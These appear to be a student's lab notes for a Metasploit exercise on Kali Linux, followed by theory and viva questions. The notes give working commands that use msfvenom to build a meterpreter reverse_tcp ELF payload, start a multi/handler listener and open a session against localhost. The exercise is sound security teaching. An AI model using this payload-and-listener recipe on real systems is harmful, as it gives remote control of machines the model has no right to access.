*********************exp5 Metasploit  To exploit (Kali Linux)************************

(open kali) 


run this commands one by one


						msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > /tmp/shell.elf
	(Explanation:
		-p linux/x86/meterpreter/reverse_tcp = Linux payload.
		LHOST=127.0.0.1 = connect back to localhost.
		LPORT=4444 = any free port.
		-f elf = output a Linux ELF binary.
		> /tmp/shell.elf = save it to /tmp/shell.elf.
		âœ… This creates a malicious file that, when executed, connects to Metasploit!)


msfconsole

use exploit/multi/handler 
	set PAYLOAD linux/x86/meterpreter/reverse_tcp
	set LHOST 127.0.0.1
	set LPORT 4444
	exploit

(This makes Metasploit wait for your payload to connect back.You will see: [*] Started reverse TCP handler on 127.0.0.1:4444)

open new terminal

chmod +x /tmp/shell.elf

/tmp/shell.elf
(As soon as you run it...ðŸ‘‰ Go back to your Metasploit console. You should get a Meterpreter session like: [*] Meterpreter session 1 opened âœ… You now own your own machine via Meterpreter!)


open the old terminal you will be automatically into meterpreter shell (mtlb hogaya exploit)



type "sysinfo"   explaination: sysinfo â€” see system info  (isko mam ko dikhana krke)
			sysinfo


(output:

5.1 Aim: Use Metasploit To exploit (Kali Linux)

5.2 Lab Outcome: 
â€¢ By the end of this lab, students will be able to:
â€¢ Understand the working of Metasploit Framework.
â€¢ Identify and exploit vulnerabilities in a target system.
â€¢ Perform post-exploitation tasks.



What is Metasploit?
Metasploit Framework is a powerful open-source tool used for penetration testing, vulnerability exploitation, and post-exploitation.
It provides a collection of payloads, exploits, encoders, and listeners used to simulate real-world attacks.

ðŸ”¸ What is Localhost Exploitation?
	Localhost exploitation involves attacking the same system you're operating from (127.0.0.1 / loopback address).
	It is mainly used for testing payloads, understanding exploit flow, and safe practice.

ðŸ”¸ Key Components Involved

Component        	Description
Payload	               A small piece of code used to control the target system after exploitation. We use meterpreter/reverse_tcp here.
LHOST	               The attacker's IP (here, 127.0.0.1, meaning the attacker and victim are the same system).
LPORT	               The port used to connect back to the attacker.
Handler	               A listener in Metasploit that waits for the payload to connect.
Meterpreter	       A powerful payload that provides command execution, file upload/download, process migration, and more.

ðŸ”¸ Why Use Localhost?
	No network setup required.
	Best for testing payloads and learning how exploits work.
	Safe â€” no risk of affecting others.
	Helps in understanding reverse shells, listener setup, and Meterpreter capabilities.

ðŸ”¸ Common Viva Questions

Question	Answer
1)What is msfvenom used for?	
	It is used to generate payloads (malicious code).

2)What is the difference between exploit and payload?	
	Exploit = method to take advantage of a vulnerability; Payload = code executed after successful exploitation.

3)What is Meterpreter?	
	A powerful post-exploitation tool that gives interactive shell access.

4)Why use reverse_tcp payload?	
	It makes the target system connect to the attacker, which bypasses firewalls/NAT.

5)What is the purpose of the handler?	
	To listen for incoming connections from the payload.

6)What happens when shell.elf is executed?
	It initiates a reverse TCP connection to Metasploit, opening a Meterpreter session.
	
7)Why do we set LHOST=127.0.0.1?	
	Because we are targeting the same system â€” our localhost.

ðŸ”¸ Real-world Limitation
	In real attacks, targets are remote, not localhost.
	Localhost exploitation is only for educational and testing purposes.
	In real-world pentesting, you need reconnaissance, vulnerability scanning, and bypassing security mechanisms.

âœ… Summary Points to Remember
	msfvenom = payload generator
	msfconsole = main Metasploit interface
	exploit/multi/handler = used to listen for reverse shells	
	reverse_tcp = payload that calls back to attacker
	127.0.0.1 = localhost (loopback IP)
	Meterpreter = interactive post-exploitation shell
